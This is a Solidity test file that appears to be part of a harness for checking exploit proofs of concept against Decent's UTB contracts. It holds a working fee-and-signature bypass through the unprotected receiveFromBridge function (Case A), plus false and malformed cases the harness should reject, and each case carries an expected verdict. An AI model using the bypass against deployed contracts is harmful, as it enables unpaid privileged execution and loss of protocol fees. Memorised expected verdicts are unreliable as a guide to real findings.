// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {VerifyGate} from "./VerifyGate.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

// Real, in-scope target contracts (relative to test/_vagent/).
import {UTB} from "../../src/UTB.sol";
import {UTBExecutor} from "../../src/UTBExecutor.sol";
import {UTBFeeCollector} from "../../src/UTBFeeCollector.sol";
import {ISwapper} from "../../src/interfaces/ISwapper.sol";
import {SwapParams} from "../../src/swappers/SwapParams.sol";
import {
    SwapInstructions,
    FeeStructure,
    SwapAndExecuteInstructions
} from "../../src/CommonTypes.sol";

// ---------------------------------------------------------------------------
// Minimal scaffolding so we exercise the REAL UTB fee/verification path with a
// focused deployment instead of the full cross-chain stack.
// ---------------------------------------------------------------------------

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK", 18) {}
    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }
}

/// A no-op swapper that satisfies ISwapper and returns a fixed tokenOut with
/// zero amount, so `_swapAndExecute` reaches `executor.execute` (and thus the
/// payload) without needing a live AMM. The bug under test is in the fee/auth
/// path, not the swap maths.
contract MockSwapper is ISwapper {
    address public tokenOut;
    constructor(address _tokenOut) {
        tokenOut = _tokenOut;
    }
    function getId() external pure returns (uint8) {
        return 1;
    }
    function swap(bytes memory) external view returns (address, uint256) {
        return (tokenOut, 0);
    }
    function updateSwapParams(SwapParams memory, bytes memory payload)
        external
        pure
        returns (bytes memory)
    {
        return payload;
    }
}

/// The privileged effect an attacker wants executed through UTB. Each successful
/// execution increments `pwnedCount`.
contract Target {
    uint256 public pwnedCount;
    function pwn() external {
        pwnedCount++;
    }
}

// ---------------------------------------------------------------------------
// Scenario: shared seed + invariant + honest control for the Decent UTB fee
// path. The three cases differ ONLY in runAttack().
// ---------------------------------------------------------------------------

abstract contract DecentFeeBypassScenario is VerifyGate {
    UTB internal utb;
    UTBExecutor internal executor;
    UTBFeeCollector internal feeCollector;
    MockSwapper internal swapper;
    MockERC20 internal feeToken;
    Target internal target;

    uint256 internal constant FEE = 1e18;
    uint256 internal signerPk = 0xA11CE;
    address internal signer;
    address internal user;     // honest user (control)
    address internal attacker;

    function describeInvariant() public pure virtual override returns (string memory) {
        // Independent of any attack: in honest operation every privileged
        // execution is paid for, so executions == fee-payments.
        return "UTB swap-executes are signature/fee gated: target.pwnedCount == feesCollected/FEE";
    }

    function _seed() internal override {
        signer = vm.addr(signerPk);
        user = makeAddr("honestUser");
        attacker = makeAddr("attacker");

        feeToken = new MockERC20();
        target = new Target();

        utb = new UTB();
        executor = new UTBExecutor();
        feeCollector = new UTBFeeCollector();
        swapper = new MockSwapper(address(feeToken));

        // Wire the system exactly as the protocol intends.
        executor.transferOwnership(address(utb));        // UTB drives the executor
        feeCollector.setUtb(address(utb));               // only UTB may collect
        feeCollector.setSigner(signer);                  // off-chain fee validator
        utb.setExecutor(address(executor));
        utb.setFeeCollector(payable(address(feeCollector)));
        utb.registerSwapper(address(swapper));

        // Fund actors with fee tokens.
        feeToken.mint(user, 100 * FEE);
        feeToken.mint(attacker, 100 * FEE);
    }

    function _invariantHolds() public view virtual override returns (bool) {
        uint256 executions = target.pwnedCount();
        uint256 feesPaid = feeToken.balanceOf(address(feeCollector)) / FEE;
        return executions == feesPaid;
    }

    /// Control: a fully-authorized, fee-paying swapAndExecute by an honest user.
    function honestAction() external override {
        _signedSwapAndExecute(user, _validSignature);
    }

    // ---- helpers ---------------------------------------------------------

    function _buildInstructions(address actor)
        internal
        view
        returns (SwapAndExecuteInstructions memory instr, FeeStructure memory fees)
    {
        SwapParams memory sp = SwapParams({
            amountIn: 0,
            amountOut: 0,
            tokenIn: address(feeToken),
            tokenOut: address(feeToken),
            direction: 0,
            path: ""
        });
        SwapInstructions memory si = SwapInstructions({
            swapperId: 1,
            swapPayload: abi.encode(sp)
        });
        instr = SwapAndExecuteInstructions({
            swapInstructions: si,
            target: address(target),
            paymentOperator: address(target),
            refund: payable(actor),
            payload: abi.encodeWithSignature("pwn()")
        });
        fees = FeeStructure({bridgeFee: 0, feeToken: address(feeToken), feeAmount: FEE});
    }

    function _validSignature(bytes memory packedInfo)
        internal
        view
        returns (bytes memory)
    {
        bytes32 h = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(packedInfo))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, h);
        return abi.encodePacked(r, s, v);
    }

    /// Runs a real, fee-paying swapAndExecute as `actor`. `sign` produces the
    /// signature over the packedInfo the contract will reconstruct.
    function _signedSwapAndExecute(
        address actor,
        function(bytes memory) internal view returns (bytes memory) sign
    ) internal {
        (SwapAndExecuteInstructions memory instr, FeeStructure memory fees) =
            _buildInstructions(actor);
        bytes memory sig = sign(abi.encode(instr, fees));
        vm.startPrank(actor);
        feeToken.approve(address(utb), FEE);
        utb.swapAndExecute(instr, fees, sig);
        vm.stopPrank();
    }
}

// ===========================================================================
// CASE A — known-true finding (Code4rena 2024-01-decent M-03).
// receiveFromBridge has no access control and skips retrieveAndCollectFees,
// so an attacker executes a swap+payload with NO signature and NO fee.
// Expected verdict: CONFIRMED.
// ===========================================================================
contract DecentReceiveFromBridgeBypass is DecentFeeBypassScenario {
    function caseId() public pure override returns (string memory) {
        return "M03_receiveFromBridge_unauth_fee_bypass";
    }

    function runAttack() external override {
        (SwapAndExecuteInstructions memory instr, ) = _buildInstructions(attacker);
        vm.startPrank(attacker);
        utb.receiveFromBridge(
            instr.swapInstructions,
            instr.target,
            instr.paymentOperator,
            instr.payload,
            instr.refund
        );
        vm.stopPrank();
    }
}

// ===========================================================================
// CASE B — flatly false hypothesis.
// "A forged signature passes collectFees and bypasses the fee check in
// swapAndExecute." It does not: the require(recovered == signer) holds and the
// call reverts. The exploit never executes.
// Expected verdict: REJECTED_ATTACK_REVERTED.
// ===========================================================================
contract DecentForgedSignatureFalse is DecentFeeBypassScenario {
    function caseId() public pure override returns (string memory) {
        return "forged_signature_passes_collectFees__FALSE";
    }

    function runAttack() external override {
        (SwapAndExecuteInstructions memory instr, FeeStructure memory fees) =
            _buildInstructions(attacker);
        bytes memory bogus = abi.encodePacked(
            bytes32(uint256(1)), bytes32(uint256(2)), uint8(27)
        ); // 65 bytes, recovers to something that is not `signer`
        vm.startPrank(attacker);
        feeToken.approve(address(utb), FEE);
        utb.swapAndExecute(instr, fees, bogus); // reverts: "Wrong signature"
        vm.stopPrank();
    }
}

// ===========================================================================
// CASE C — "passes for the wrong reason" (the dangerous one).
// The PoC performs a fully-valid, fully-PAID swapAndExecute and CLAIMS it
// demonstrates a fee bypass. The transaction SUCCEEDS and changes on-chain
// state (pwnedCount++ AND fees collected). A naive "did the tx do something?"
// gate would launder this into a finding. Our gate re-checks the invariant:
// executions == feesPaid still holds, so it is REJECTED.
// Expected verdict: REJECTED_INVARIANT_INTACT.
// ===========================================================================
contract DecentPaidSwapWrongReason is DecentFeeBypassScenario {
    function caseId() public pure override returns (string memory) {
        return "paid_swap_claimed_as_bypass__WRONG_REASON";
    }

    function runAttack() external override {
        // Real, signed, fee-paying swap by the attacker: state changes, no revert,
        // but the invariant is NOT violated.
        _signedSwapAndExecute(attacker, _validSignature);
    }
}

// ===========================================================================
// CASE D — malformed BASELINE (the gate auditing its own measuring stick).
// A perfectly real exploit may sit behind this, but the PREDICATE is false on
// honest seeded state (feeCollector holds nothing at rest). A predicate that is
// false at baseline cannot witness a "break", so the gate refuses to proceed.
// Expected verdict: REJECTED_MALFORMED_BASELINE (attack is never reached).
// ===========================================================================
contract DecentMalformedBaseline is DecentFeeBypassScenario {
    function caseId() public pure override returns (string memory) {
        return "malformed_baseline__predicate_false_at_rest";
    }

    function describeInvariant() public pure override returns (string memory) {
        return "BROKEN PREDICATE (demo): feeCollector.balance > 0 at baseline (false on honest seeded state)";
    }

    function _invariantHolds() public view override returns (bool) {
        // False at rest: no fees have been collected yet.
        return feeToken.balanceOf(address(feeCollector)) > 0;
    }

    function runAttack() external override {
        revert("unreached: gate must stop at baseline");
    }
}

// ===========================================================================
// CASE E — malformed CONTROL (the demonstrator that proves the Control guard).
// The predicate holds at baseline but is TOO BRITTLE: a legitimate, fully-paid
// swap "breaks" it by design. If the gate trusted this predicate it would hand
// back a false CONFIRMED. Control catches it before the attack is ever judged.
// Expected verdict: REJECTED_MALFORMED_CONTROL (attack is never reached).
// ===========================================================================
contract DecentMalformedControl is DecentFeeBypassScenario {
    function caseId() public pure override returns (string memory) {
        return "malformed_control__predicate_broken_by_honest_use";
    }

    function describeInvariant() public pure override returns (string memory) {
        return "BROKEN PREDICATE (demo): target.pwnedCount == 0 (any legitimate paid swap violates it)";
    }

    function _invariantHolds() public view override returns (bool) {
        // True at baseline (0 == 0), but any honest swap-execute makes it false.
        return target.pwnedCount() == 0;
    }

    function runAttack() external override {
        revert("unreached: gate must stop at control");
    }
}
